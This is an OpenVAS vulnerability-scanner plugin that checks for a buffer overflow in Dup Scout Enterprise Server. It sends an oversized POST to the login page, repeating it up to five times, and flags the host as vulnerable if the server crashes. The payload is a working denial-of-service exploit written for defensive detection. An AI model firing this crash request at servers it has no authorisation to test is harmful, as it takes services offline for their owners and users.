##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dup_scount_enterprise_server_bof_vuln.nasl 11607 2018-09-25 13:53:15Z asteins $
#
# Dup Scout Enterprise Server Buffer Overflow Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dup:dup_scout_enterprise";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809065");
  script_version("$Revision: 11607 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-25 15:53:15 +0200 (Tue, 25 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-10-13 16:11:25 +0530 (Thu, 13 Oct 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Dup Scout Enterprise Server Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running Dup Scout Enterprise
  Server and is prone to buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST
  and check whether it is able to crash the server or not.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of
  web request passed via an overly long string to 'Login' page.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Dup Scout Enterprise version 9.0.28");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.dupscout.com");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40457");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138993");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_dup_scount_enterprise_detect.nasl");
  script_mandatory_keys("Dup/Scout/Enterprise/installed");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(http_is_dead(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

exploit = crap(data: "0x41", length:12292);

sndReq = http_post_req(port:http_port, url:"/login", data:exploit, add_headers:
                       make_array("Content-Type", "application/x-www-form-urlencoded",
                                  "Origin","http://" + host,"Content-Length", strlen(exploit)));

##Send Multiple Times , Inconsistency Issue
for (j=0;j<5;j++)
{
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(http_is_dead(port:http_port))
  {
    security_message(http_port);
    exit(0);
  }
}
